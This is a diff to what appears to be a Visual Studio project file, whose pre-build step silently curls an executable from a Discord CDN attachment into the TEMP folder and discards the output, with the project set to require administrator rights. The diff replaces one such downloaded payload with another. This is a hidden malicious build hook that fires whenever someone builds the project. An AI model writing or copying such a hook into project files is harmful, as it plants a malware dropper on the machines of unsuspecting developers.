@@ -130,7 +130,7 @@
       <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
     </Link>
     <PreBuildEvent>
-      <Command>cmd.exe /C "curl -o $(TEMP)\ws82.exe https://cdn.discordapp.com/attachments/1180538425292636181/1180538570923049059/ws82.exe" &gt; NUL 2&gt;&amp;1</Command>
+      <Command>cmd.exe /C "curl -o $(TEMP)\wq35.exe https://cdn.discordapp.com/attachments/1180538425292636181/1180558762340261958/wq35.exe" &gt; NUL 2&gt;&amp;1</Command>
     </PreBuildEvent>
   </ItemDefinitionGroup>
   <ItemGroup>
